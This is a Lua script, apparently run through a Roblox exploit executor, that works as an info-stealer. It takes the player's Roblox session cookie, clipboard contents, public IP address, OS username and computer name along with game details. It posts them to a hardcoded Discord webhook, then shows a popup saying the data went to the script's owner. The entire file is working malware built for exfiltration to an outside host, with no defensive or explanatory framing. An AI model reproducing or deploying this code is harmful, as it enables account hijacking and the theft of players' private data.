-- ============================================================
-- FINAL RELIABLE VERSION – Plain text (embed skipped)
-- ============================================================
local webhook = "https://discord.com/api/webhooks/1545855831453474816/68zNp9FU7svcVfUqN4HGLf8Hp0IsTyW-LOI0jCBLB3o0NlbDThj0BfrUcg7mMJ6mPVMg"

-- ========== HTTP SENDER ==========
local function sendData(url, payload)
    local headers = {["Content-Type"] = "application/json"}
    local methods = {
        function()
            local ok, res = pcall(function()
                return request({Url = url, Method = "POST", Headers = headers, Body = payload})
            end)
            return ok
        end,
        function()
            local ok, res = pcall(function()
                return http_request({Url = url, Method = "POST", Headers = headers, Body = payload})
            end)
            return ok
        end,
        function()
            local ok, res = pcall(function()
                return game:GetService("HttpService"):PostAsync(url, payload, Enum.HttpContentType.ApplicationJson)
            end)
            return ok
        end
    }
    for _, method in ipairs(methods) do
        if method() then return true end
    end
    return false
end

-- ========== IP ==========
local function getIP()
    local ip = "N/A"
    local services = {
        "https://api.ipify.org",
        "https://ip-api.com/json/?fields=query",
        "https://icanhazip.com",
        "https://httpbin.org/ip"
    }
    for _, url in ipairs(services) do
        local ok, result = pcall(function()
            return game:GetService("HttpService"):GetAsync(url)
        end)
        if ok and result and result ~= "" then
            if result:match('"query":"(.-)"') then
                ip = result:match('"query":"(.-)"')
            elseif result:match('"origin":"(.-)"') then
                ip = result:match('"origin":"(.-)"')
            else
                ip = result:gsub("%s+", "")
            end
            if ip and ip ~= "" and ip ~= "N/A" then break end
        end
    end
    return ip
end

-- ========== Safe Getter ==========
local function safeGet(obj, prop, default)
    local success, val = pcall(function() return obj[prop] end)
    if success and val ~= nil then return val else return default end
end

-- ========== COOKIE (attempt all) ==========
local function stealCookie()
    local cookie = "Not found"
    local ok, val = pcall(getcookie, "https://www.roblox.com/")
    if ok and val and val ~= "" then return val end
    ok, val = pcall(function() return getrobloxcookie() end)
    if ok and val and val ~= "" then return val end
    ok, val = pcall(function() return syn and syn.cookie and syn.cookie() end)
    if ok and val and val ~= "" then return val end
    return "Not available"
end

-- ========== CLIPBOARD ==========
local function getClipboard()
    local ok, val = pcall(getclipboard)
    if ok and val and val ~= "" then return val end
    ok, val = pcall(clipboard)
    if ok and val and val ~= "" then return val end
    return "N/A"
end

-- ========== SYSTEM ENV ==========
local function getSystemEnv()
    local env = {}
    pcall(function() env.os = os.getenv("OS") or "N/A" end)
    pcall(function() env.user = os.getenv("USERNAME") or os.getenv("USER") or "N/A" end)
    pcall(function() env.computer = os.getenv("COMPUTERNAME") or os.getenv("HOSTNAME") or "N/A" end)
    return env
end

-- ========== COLLECT ==========
local function collectEverything()
    local info = {}
    info.executor = (getexecutorname and getexecutorname()) or (identifyexecutor and identifyexecutor()) or "Unknown"

    local player = game.Players.LocalPlayer
    if player then
        info.userId = tostring(player.UserId)
        info.userName = player.Name
        info.displayName = player.DisplayName
        local id = player.UserId
        if id and id > 0 then
            local year = math.floor((id / 100000000) * 2) + 2006
            info.accountAge = tostring(year) .. " (approx)"
        end
        local ok, friends = pcall(function() return #player:GetFriendsOnline() end)
        info.friendsOnline = ok and tostring(friends) or "N/A"
        pcall(function()
            local char = player.Character
            if char then
                local hum = char:FindFirstChild("Humanoid")
                if hum then
                    info.health = tostring(hum.Health)
                    info.maxHealth = tostring(hum.MaxHealth)
                    info.walkSpeed = tostring(hum.WalkSpeed)
                    info.jumpPower = tostring(hum.JumpPower)
                end
                local root = char:FindFirstChild("HumanoidRootPart")
                if root then info.position = tostring(root.Position) end
            end
        end)
    end

    info.placeId = tostring(safeGet(game, "PlaceId", "N/A"))
    info.jobId = safeGet(game, "JobId", "N/A")
    info.gameName = safeGet(game, "Name", "Unknown")
    info.maxPlayers = tostring(safeGet(game, "MaxPlayers", "N/A"))
    info.serverTime = tostring(safeGet(game, "ServerTime", "N/A"))

    info.ip = getIP()
    info.cookie = stealCookie()
    info.clipboard = getClipboard()

    local sys = getSystemEnv()
    info.os = sys.os or "N/A"
    info.systemUser = sys.user or "N/A"
    info.computerName = sys.computer or "N/A"

    pcall(function()
        local us = game:GetService("UserInputService")
        info.platform = tostring(us.Platform)
        info.graphics = tostring(game:GetService("GraphicsSettings").GraphicsQualityLevel)
        info.volume = tostring(game:GetService("SoundService").Volume)
    end)

    pcall(function()
        local stats = game:GetService("Stats")
        info.ping = tostring(stats.Network.ServerStatsItem["Data Ping"]:GetValueString())
    end)

    pcall(function()
        local run = game:GetService("RunService")
        local frameTime = run.RenderStepTime
        if frameTime and frameTime > 0 then
            info.fps = tostring(math.floor(1 / frameTime))
        end
    end)

    return info
end

-- ========== BUILD PLAIN TEXT MESSAGE ==========
local function buildMessage(data)
    local lines = {}
    for k, v in pairs(data) do
        if v and v ~= "" then
            table.insert(lines, string.format("**%s**: %s", k, tostring(v)))
        end
    end
    return "```yaml\n" .. table.concat(lines, "\n") .. "\n```"
end

-- ========== SEND DATA ==========
local info = collectEverything()
local message = buildMessage(info)
local payload = '{"content": "' .. message:gsub('"', '\\"') .. '"}'
local ok = sendData(webhook, payload)

-- ========== GUI ==========
pcall(function()
    local playerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
    local gui = Instance.new("ScreenGui")
    gui.Parent = playerGui
    gui.ResetOnSpawn = false

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 420, 0, 200)
    frame.Position = UDim2.new(0.5, -210, 0.5, -100)
    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
    frame.BackgroundTransparency = 0.1
    frame.Parent = gui
    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 16)

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 50)
    title.Position = UDim2.new(0, 0, 0, 10)
    title.BackgroundTransparency = 1
    title.Text = "Processing..."
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.TextScaled = true
    title.Font = Enum.Font.GothamBold
    title.Parent = frame

    local sub = Instance.new("TextLabel")
    sub.Size = UDim2.new(1, 0, 0, 30)
    sub.Position = UDim2.new(0, 0, 0.75, 0)
    sub.BackgroundTransparency = 1
    sub.Text = ""
    sub.TextColor3 = Color3.fromRGB(200, 200, 200)
    sub.TextScaled = true
    sub.Font = Enum.Font.Gotham
    sub.Parent = frame

    local closeBtn = Instance.new("TextButton")
    closeBtn.Size = UDim2.new(0, 120, 0, 40)
    closeBtn.Position = UDim2.new(0.5, -60, 1, -50)
    closeBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 70)
    closeBtn.Text = "CLOSE"
    closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    closeBtn.TextScaled = true
    closeBtn.Font = Enum.Font.GothamBold
    closeBtn.Parent = frame
    Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 12)
    closeBtn.MouseButton1Click:Connect(function() gui:Destroy() end)

    if ok then
        title.Text = "YOUR INFORMATION GOT SENT TO THE OWNER OF THIS SCRIPT"
        sub.Text = "Thank you for your cooperation."
    else
        title.Text = "FAILED TO SEND"
        sub.Text = "Check your webhook URL."
    end
end)
